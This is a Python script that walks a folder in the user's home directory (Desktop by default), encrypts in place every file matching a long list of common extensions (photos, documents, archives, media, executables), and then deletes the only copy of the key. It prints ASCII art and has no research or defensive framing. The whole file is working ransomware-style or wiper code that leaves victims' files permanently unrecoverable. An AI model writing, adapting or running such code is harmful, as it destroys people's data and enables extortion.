import argparse
import os
import pathlib
from cryptography.fernet import Fernet

######################## ARGUMENTS ########################

parser = argparse.ArgumentParser(description='Encrypt files in a directory.')
parser.add_argument('-d', '--directory', type=str, metavar='', help='Directory to search for files to encrypt', default='Desktop')
args = parser.parse_args()

######################## FUNCTIONS ########################

def navigate_to_target_directory(directory_name):
    folder_location = pathlib.Path.home() / directory_name
    os.chdir(folder_location)
    return folder_location

def get_files_in_dir(current_directory):
    targeted_file_types = [
        '.png', '.jpg', '.jpeg', '.gif', '.bmp', '.tiff',  # Image formats
        '.doc', '.docx', '.odt',  # Document formats
        '.xls', '.xlsx', '.ods',  # Spreadsheet formats
        '.pdf', '.csv', '.txt',  # Text and data formats
        '.zip', '.tar', '.rar', '.7z',  # Archive formats
        '.mp4', '.avi', '.mkv', '.mov', '.wmv',  # Video formats
        '.mp3', '.wav', '.flac',  # Audio formats
        '.ppt', '.pptx',  # Presentation formats
        '.html', '.xml', '.json',  # Web and markup formats
        '.exe', '.bin', '.iso'  # Executable and disk image formats
    ]
    
    file_list = []
    for root, subdirectories, files in os.walk(current_directory):
        for file in files:
            for file_type in targeted_file_types:
                if file_type in file:
                    file_list.append(os.path.join(root, file))
    return file_list

def generate_key():
    key = Fernet.generate_key()
    with open('cryptographic_key.key', 'wb') as key_file:
        key_file.write(key)
    return key

def encrypt_files(file_list, key):
    fernet = Fernet(key)
    if file_list:
        for document in file_list:
            try:
                with open(document, 'rb') as file:
                    document_original = file.read()
                document_criptat = fernet.encrypt(document_original)
                with open(document, 'wb') as encrypted_document:
                    encrypted_document.write(document_criptat)
            except Exception as e:
                print(f"Error encrypting {document}: {e}")
    else:
        print('No document in directory')

def secure_delete_key(key_path):
    try:
        os.remove(key_path)
        print("Encryption key securely deleted.")
    except Exception as e:
        print(f"Error deleting key: {e}")

######################## DISPLAY ASCII ########################

ascii_art = '''
           %%+                    +%%             
          @@@@*                 =@@%@@            
         -@@#%@@=             -@@@##@@            
         +@@###%@@:   #@-    @@@####@@            
         +@@####%@@#@@@@@  %@@%#####@@+           
        .@@#######@@@%#@@@@@@@######@@*           
        .@@############@@#%@@#######@@*           
        .@@##############%@@%#######@@*           
        .@@##########@@@@@@#########@@*           
        .@@#######%@@%*  :%@@%%#####@@*           
        .@@#####%@@*         @@@%###@@*           
        %@@####@@#.           :@@@##@@@.          
      *@@%###%@#.               -@@##%@@%:        
      #@@%#%@@#                  .%@@#@@%:        
     *@@@@#@@=@@@@@@@#     @@@@@@@@ @@%@@@*       
  :@@@%%###@@=@@#  -@@-   #@%  .#@@ @@#@@@:       
  :%@@#####@@#@@%==+@@-   #@@===%@@+@@@@%+        
    :@@@@@@#@@-%@@@@%      %@@@@@#*@%#%%@@+       
      .@@@%##%@+                 @@%##%@@@        
      .@@@@##%@@@%.          .*@@@@#####%@@@      
 -@@@@@@@########@@@@@@@@@@@@@@########%@@%:      
  @@@%################################@@@-        
   :-@@@@@@###@@@@%###########@@@@@####%@@@%      
      *@@%#%@@%%%################%@@@#####@@@:    
    .#@@##%@@#######################@@%@@@%#      
    @@####@@#@%###################@@@@@%@@        
  :@@@@@%@@%#@@##################%@@#%@@%@*       
      @@@@@##%@@#################@@###%@@@@:      
      @@@@####@@%###############@@@####@@:        
      @@@%####@@%###############@@@#####@@        
      *@%#####@@%###############@@@#####%@*       
     *@@#####%@@%###############%@@######@@:      
    :@@######%@@#################@@#######@@
'''

print(ascii_art)

######################## RUNNING THE ENCRYPTION ########################

directory = navigate_to_target_directory(args.directory)
documents = get_files_in_dir(directory)
key = generate_key()
encrypt_files(documents, key)
secure_delete_key('cryptographic_key.key')
